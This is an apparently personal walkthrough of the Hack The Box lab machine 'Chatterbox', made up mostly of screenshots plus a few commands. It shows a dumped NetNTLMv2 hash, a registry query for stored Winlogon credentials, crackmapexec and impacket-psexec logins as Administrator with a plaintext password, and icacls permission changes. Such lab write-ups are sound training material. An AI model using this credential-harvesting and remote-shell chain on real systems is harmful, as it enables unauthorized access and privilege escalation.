### 11-Jan-24-Thu (Happy Karen New Year)

[Chatterbox](https://app.hackthebox.com/machines/Chatterbox)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4003e9b5-e042-4687-831e-8067ea824039)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/48fa5920-6a85-43b0-b06f-9371a5497b8c)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/243727a8-2e81-4d97-a723-bd0ac7085af8)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9289f585-646d-4e47-b7f3-1d64f42e358f)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9094bda7-efdc-490c-a7e8-c9541fa42cb0)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fbebf7af-9813-42dc-8767-d7062984c3bf)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/907e0ded-20e5-448e-9a14-baeb1b6c3e6c)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/42f24140-6124-4271-8ab4-5b348c185e65)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/357b4356-b451-40d6-a91a-6aade23b5c01)

```
����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    Alfred::CHATTERBOX:1122334455667788:2243052000308a69ff9ee7abdbda42e0:0101000000000000951ee8459444da010d5ace7e59f3fe52000000000800300030000000000000000000000000200000cfee5101f0d14acaa47db8dfb05734f85659b621092b5e24c348f2838abb6b600a00100000000000000000000000000000000000090000000000000000000000
```

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/6beec470-f5da-4123-ac91-0534948388e6)

```
smbclient -L 10.129.61.158 -U Administrator
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/8b76fd45-1b98-4e74-b060-03bf30bb8dfb)

```
crackmapexec smb 10.129.61.158 -u 'Administrator' -p 'Welcome1!'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31e91654-c744-4bb7-8ede-30dbd97df62a)

```
impacket-psexec CHATTERBOX/Administrator:'Welcome1!'@10.129.61.158
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7c645509-8d65-4872-a843-6f7aa5504fa8)

```
icacls "C:\Users\Administrator\Desktop\root.txt" /grant:r "alfred:(R)"
```

```
icacls "C:\Users\Administrator\Desktop\root.txt" /grant Alfred:F /t /c
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f84a4212-469b-4f6a-bf3a-0b14366c3d6f)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1477e9fa-5c08-41df-97a0-893ba858308b)

